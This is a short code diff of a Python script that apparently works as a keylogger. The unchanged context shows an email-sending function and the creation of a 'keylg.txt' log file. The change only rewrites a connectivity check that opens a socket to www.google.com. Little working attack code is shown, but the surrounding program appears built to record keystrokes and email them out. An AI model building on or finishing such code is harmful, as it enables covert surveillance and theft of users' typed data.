@@ -52,15 +52,14 @@ def emailsender():
     smtpobj.sendmail(fromadd , toadd , text)
     smtpobj.quit() 
     
-def is_connected(): 
+def is_connected():
     try:
-        host = socket.gethostbyname(hostname)
-        s = socket.create_connection((host, 80), 2)
-        s.close()
-        print(True)
-    except:
+        socket.create_connection(('www.google.com', 80))
+        return True
+    except OSError:
         pass
-        print(False)
+        return False
+
         
 def filecreation():
     filename = save + '\\keylg' + '.txt'
